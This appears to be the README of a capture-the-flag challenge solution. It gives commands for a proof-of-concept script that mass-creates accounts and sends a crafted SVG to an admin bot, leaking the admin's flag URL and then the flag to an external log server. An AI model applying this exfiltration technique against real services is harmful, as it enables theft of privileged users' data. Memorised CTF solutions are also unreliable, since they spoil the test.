# Solver

1. If [users.json](users.json) is not yet populated run the bellow command. It will create 400 accounts, upload files, share them between accounts and store sessions and csrfs.
(preferably add your own account prefix, each created account will append an integer as suffix, e.g. acc3214_12)
```sh
python3 solution/poc.py --reset --prefix acc3214_
```

2. Then run the below command to leak the admin's flag URL by sending [send_to_admin.svg](./send_to_admin.svg) while specifying the `--log-server` that will retrieve the leaked data

```sh
python3 solution/poc.py --leak-domain --log-server 'https://examplebin.org'
```

3. After retrieving the domain part of the flag, run the bellow command to find a collision domain and then send [send_to_admin.svg](./send_to_admin.svg) to admin once again, but this time to leak the flag.

```sh
python3 solution/poc.py --log-server 'https://examplebin.org' --send --domain doc-12-73561
```
___
*Note that non-used sessions expire after 60 minutes so you might want to run `python3 solution/poc.py --refresh` once in a while, or add `--refresh` when leaking the domain.*

